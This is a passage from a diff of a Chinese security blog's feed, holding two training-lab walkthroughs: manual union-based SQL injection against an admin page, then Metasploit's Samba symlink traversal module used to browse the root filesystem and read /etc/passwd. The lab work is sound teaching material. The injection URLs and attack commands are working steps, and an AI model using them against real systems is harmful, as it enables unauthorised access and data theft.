-<p>访问 【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/do= editcurrency&amp;cid=1】。如图3所示<br><img alt="图3" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3.png" class="lazyload"></p>
-<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/do= editcurrency&amp;cid=1】,发现页面和前面页面不一样,说明当前页面存在注入。如图4所示<br><img alt="图4" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4.png" class="lazyload"></p>
-<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/?do= editcurrency&amp;cid=1+ order+by+5+–+】,发现页面正常。如图5所示<br><img alt="图5" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5.png" class="lazyload"></p>
-<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/?do= editcurrency&amp;cid=1+ order.+by+6+–+】,发现页面和前面页面不一样,说明当前查询了5个字段。如图6所示<br><img alt="图6" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6.png" class="lazyload"></p>
-<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/?do=editcurrency&amp;cid=1+union+select+1, 2, 3, 4,5+–+】,发现1和3回显了。如图7所示<br><img alt="图7" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7.png" class="lazyload"></p>
-<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/?do=editcurrency&amp;cid=l+union+select+1, user(),3,version(),5+–+】,直询当前的用户和版本。如图8所示<br><img alt="图8" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8.png" class="lazyload"></p>
-<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/?do=editcurrency&amp;cid=1+union+select+1, group_concat(schema name),3, 4, 5+from+information schemaschemata+–+】,查询当前的所有数据库。如图9所示<br><img alt="图9" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/9.png" class="lazyload"></p>
-<p>在目标机中打开【 C: \phpstudy\admin\classes\ Core \Settings】下的【 Ccurrencysettings. php】中的第182行,调用了editcurrency会找到 showeditcurrency函数,然后判断是否接收cid参数,如果接收实例化Bin_Query类然后调用里面的 executequery函数执行sq语句。如图10所示<br><img alt="图10" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/10.png" class="lazyload"></p>
-<p>打开【C:\phpstudy\www\bin】下的【 Query. php】中的第49行,可以看到执行Sql语句并没有过滤。如图11所示<br><img alt="图11" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/11.png" class="lazyload"></p>
-<h2 id="加深理解"><a href="#加深理解" class="headerlink" title="加深理解"></a>加深理解</h2><p>SQL注入攻击是黑客对数据库进行攻击的常用手段之一。随着B/S模式应用开发的发展，使用这种模式编写应用程序的程序员也越来越多。但是由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。                  ————引用百度百科</p>
-<h2 id="自己对他的一点理解"><a href="#自己对他的一点理解" class="headerlink" title="自己对他的一点理解"></a>自己对他的一点理解</h2><p>sql注入是我接触信息安全最早的一个漏洞，我相信很多很多人开始学习渗透的时候，应该都是从注入开始的，说说我最早的是怎么理解这个漏洞的吧，我是一个软件工程的学生，我们从大一下册做作品的时候就开始接触到数据库操作语句，增删改查是我们用的最多了，然而这里面用的最多的也就是查，SQL注入漏洞正是网站对传入的参数未进行判断就带入系统查询，所以使得渗透人员可以从此判断出数据库是否存在这一条内容，SQL注入我一开始就是用工具上手的，sqlmap，穿山甲，啊D，明小子，我都用过，其实现在的网站只要不是太旧，大多都会上安全狗，即使你源码存在对参数的未过滤，安全狗也会对你访问网站时的操作进行判断，他会有一套规则来防止你进行SQL注入，当然，上有政策，下有对策，有防护就有绕过，你能摸透他防护的规则也可以用方法绕过，这就涉及到手工注入了，除了在网站网址哪里进行SQL注入，也有别的地方可以进行注入，一般网站源码中一般都会存在条件查询的语句，带有条件查询的地方，就有可能存在注入，例如站内的搜索……<br>在我看来，注入更多的是需要实战和经验。</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞</title>
-    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAsysmlink%20%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>Metasploit溢出sysmlink 默认配置目录遍历漏洞</p>
-<a id="more"></a>
-
-<h2 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h2><p>![图1](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/1.jpeg)</p>
-<h2 id="利用nmap工具扫描目标主机"><a href="#利用nmap工具扫描目标主机" class="headerlink" title="利用nmap工具扫描目标主机"></a>利用nmap工具扫描目标主机</h2><p>1.1使用nmap命令对目标主机进行扫描。单击桌面空白处,右键菜单选择“在终端中打开”。如图1所示<br>![图2](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/2.jpeg)</p>
-<p>1.2在终端中输入命令”nmap -sV 192.168.1.3”,对目标主机进行端口扫描,发现开放445端口、139端囗并且安装samba软件,版本为3。如图2所示<br>![图3](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/3.jpeg)</p>
-<p>1.3在终端中输入命令” msfconsole”,启动MSF终端如图3所示<br>![图4](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/4.jpeg)</p>
-<p>1.4在终端中输入命令” search samba”,搜索 samba的相关工具和攻击载荷。如图4所示<br>![图5](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/5.jpeg)</p>
-<p>1.5在终端中输入命令”use auxiliary/admin/smb/samba_symlink_traversal”,启用漏洞利用模块,提示符就会提示进入到该路径下。如图5所示<br>![图6](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/6.jpeg)</p>
-<p>1.6在终端中输入命令”info”,查看需要设置的相关项,”yes”表示必须填写的参数。如图6所示<br>![图7](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/7.jpeg)</p>
-<p>1.7在终端中输入命令” set RHOST 192.168.1.3”,设置目标主机的P地址。如图7所示<br>![图8](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/8.jpeg)</p>
-<p>1.8在终端中输入” set SMBSHARE tmp”,设置SAM可写文件。如图8所示<br>![图9](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/9.jpeg)</p>
-<p>1.9在终端中输入” exploit”,开始攻击。如图9所示<br>![图10](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/10.jpeg)</p>
-<p>1.10新打开一个终端,输入” smbclient //192.168.1.3/tmp”,直接回车,不用输入密码。如图10所示<br>![图11](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/11.jpeg)</p>
-<p>1.11在终端中输入” cd rootfs”,进入 rootfs目录在终端下输入命令”ls”,列出目录(命令无回显)。如图11所示<br>![图12](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/12.jpeg)</p>
-<p>1.12在终端中输入”more /etc/passwd”,查看目标主机系统中的密码。如图12所示<br>![图13](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/13.jpeg)</p>
-]]></content>
-      <categories>
-        <category>奇技淫巧</category>
-      </categories>
-      <tags>
-        <tag>内网渗透</tag>
       </tags>
   </entry>
   <entry>
